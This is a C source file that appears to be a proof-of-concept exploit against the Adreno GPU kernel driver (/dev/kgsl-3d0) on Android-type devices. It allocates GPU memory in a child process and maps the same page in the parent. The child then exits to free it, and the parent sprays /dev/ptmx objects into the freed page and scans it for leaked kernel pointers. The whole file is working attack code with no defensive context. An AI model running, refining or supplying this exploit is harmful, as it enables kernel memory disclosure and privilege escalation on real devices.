#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/socket.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

struct gpumem_alloc_req {
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
};

int main() {
    int pipefd[2];
    pipe(pipefd);

    pid_t pid = fork();
    if (pid == 0) {
        // Child
        int fd1 = open("/dev/kgsl-3d0", O_RDWR);
        struct gpumem_alloc_req req = {0};
        req.size = 0x1000;
        ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req);
        
        printf("[Child] Allocated at 0x%lx\n", req.gpuaddr);
        write(pipefd[1], &req.gpuaddr, sizeof(req.gpuaddr));

        // Wait to be killed or exit
        sleep(2);
        printf("[Child] Exiting to trigger memory free...\n");
        close(fd1);
        exit(0);
    }

    // Parent
    uint64_t gpuaddr = 0;
    read(pipefd[0], &gpuaddr, sizeof(gpuaddr));

    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    uint64_t *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, gpuaddr);
    
    if (ptr2 == MAP_FAILED) {
        perror("[-] Parent mmap failed");
        return 1;
    }
    printf("[Parent] mmap successful at %p\n", ptr2);
    ptr2[0] = 0x1122334455667788ULL;

    wait(NULL); // Wait for child to exit and free the memory

    // Now memory is freed! Let's spray PTMX and see if we can read it
    printf("[Parent] Child exited. Spraying PTMX...\n");
    int spray_fds[100];
    for (int i = 0; i < 100; i++) {
        spray_fds[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }

    printf("[Parent] Scanning page for kernel pointers...\n");
    for (int i = 0; i < 0x1000 / 8; i++) {
        uint64_t val = ptr2[i];
        if (val != 0 && val != 0x1122334455667788ULL) {
            printf("[+] Offset 0x%x: 0x%016lx\n", i * 8, val);
        }
    }

    return 0;
}
